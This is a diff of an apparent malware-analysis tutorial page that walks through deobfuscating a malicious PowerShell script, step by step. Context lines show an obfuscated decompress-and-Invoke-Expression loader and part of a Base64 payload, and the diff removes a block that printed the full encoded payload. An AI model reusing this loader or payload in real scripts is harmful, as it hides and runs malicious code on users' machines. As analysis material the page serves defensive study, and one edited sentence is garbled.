@@ -293,7 +293,7 @@ $EnvironmentType = [Type]("eNvIR" + "O" + "NM" + "ent");  # Resolves to 'Environ
       <strong>DeobShell</strong> leverages the .NET Framework's Abstract Syntax Tree (AST) to parse and deobfuscate PowerShell scripts. The AST provides a hierarchical tree representation of the script's syntax, allowing tools like DeobShell to analyze and transform obfuscated code systematically.
     </p>
     <p>
-      By parsing the AST, DeobShell can identify patterns such as variable assignments, method invocations, and string manipulations. It then refactors the script by renaming variables to meaningful names, simplifying expressions, and reconstructing dynamically built method names.
+      By parsing the AST with DeobShell can identify patterns such as the ones just discussed. It then refactors the script's variables, simplifies expressions, and reconstructs dynamically built method names.
     </p>
     <p>
       In our example, DeobShell parses the AST to:
@@ -304,7 +304,7 @@ $EnvironmentType = [Type]("eNvIR" + "O" + "NM" + "ent");  # Resolves to 'Environ
       <li>Extract and reconstruct encoded or compressed payloads embedded within the script.</li>
     </ul>
 
-    <h4>5. Final Deobfuscated Script</h4>
+    <h4>4. Final Deobfuscated Script</h4>
     <pre><code>
 $EnvironmentType = [Type]("eNvIR" + "O" + "NM" + "ent");  # 'Environment'
 $InvokeExpression = 'iex';  # Result from dynamic string construction
@@ -313,7 +313,7 @@ $DecompressedData = [Text.Encoding]::ASCII.GetString([Compression.DeflateStream]
 Invoke-Expression($DecompressedData);
     </code></pre>
 
-    <h3 id="step-2-extracting-the-base64-string">Step 2: Extracting the Base64 String</h3>
+    <h3 id="step-2-extracting-and-decoding-the-base64-string">Step 2: Extracting and Decoding the Base64 String</h3>
     <p><strong>Objective:</strong> Isolate the Base64-encoded string embedded within the script for decoding.</p>
     <p><strong>Approach:</strong></p>
     <ul>
@@ -327,29 +327,13 @@ $Base64String = "NZBRa8IwFEb/Sh8CUZzpsDidoeA2HbiissnoBntp4x2JTZM2TVuL+N9Xy/p6z+H
     </code></pre>
     <p><strong>Outcome:</strong></p>
     <p>The Base64 string is now isolated and ready for decoding.</p>
-
-    <h3 id="step-3-decoding-the-base64-string">Step 3: Decoding the Base64 String</h3>
-    <p><strong>Objective:</strong> Convert the Base64 string into a byte array for further processing.</p>
+    <p>Convert the Base64 string into a byte array for further processing.</p>
     <p><strong>Approach:</strong></p>
     <ul>
       <li><strong>Use Decoding Tools:</strong> PowerShell, Python, or CyberChef can decode Base64 strings.</li>
       <li><strong>Ensure Integrity:</strong> Verify that the decoded data matches expectations (e.g., correct byte length).</li>
     </ul>
-    <p><strong>Implementation:</strong></p>
-    <p>Using PowerShell:</p>
-    <pre><code>
-$Base64String = "NZBRa8IwFEb/Sh8CUZzpsDidoeA2HbiissnoBntp4x2JTZM2TVuL+N9Xy/p6z+HAd1EuA19BPdbxCZh1dmBJCPGLFKAsRfvtwcfc2mzhukwomN8Tpkli3Lqq3ZwH66mRycfy35CisI0uDdcpFIRFrp7mqyJ8hl7gwsC4ilQbSd2HY1k0/LH2eirY2ZYmgabDaj353j6dPoMeF5mWkRGMd7iSbxPtJRM+w+SQSWEHeImHFH3FR8d3sDebY4pM+O4jUNXCQpqN8A8e3fgIEzgDpr/aQMT4AO1D5gjl3NYOL9Y0F9R+hax0raSOjq9CQufcObfgkG5UpRMYb9pod6Fx20nolUWW8cv1+gc=";
-$bytes = [Convert]::FromBase64String($Base64String);
-Write-Output "Decoded Byte Array Length: $($bytes.Length) bytes";
-    </code></pre>
-    <p><strong>Output:</strong></p>
-    <pre><code>
-Decoded Byte Array Length: 180 bytes
-    </code></pre>
-    <p><strong>Explanation:</strong></p>
-    <p>The Base64 string successfully decodes into a 180-byte array, ready for decompression.</p>
-
-    <h3 id="step-4-decompressing-the-payload">Step 4: Decompressing the Payload</h3>
+    <h3 id="step-3-decompressing-the-payload">Step 3: Decompressing the Payload</h3>
     <p><strong>Objective:</strong> Uncompress the decoded byte array to reveal the underlying PowerShell script.</p>
     <p><strong>Approach:</strong></p>
     <ul>
@@ -386,7 +370,7 @@ foreach ($OWc in $OMS) {
     <p><strong>Explanation:</strong></p>
     <p>The decompressed script is now readable and outlines its malicious intent.</p>
 
-    <h3 id="step-5-analyzing-the-decompressed-script">Step 5: Analyzing the Decompressed Script</h3>
+    <h3 id="step-4-analyzing-the-decompressed-script">Step 4: Analyzing the Decompressed Script</h3>
     <p><strong>Objective:</strong> Understand the functionality and malicious operations of the decompressed script.</p>
     <p><strong>Decompressed Script:</strong></p>
     <pre><code>
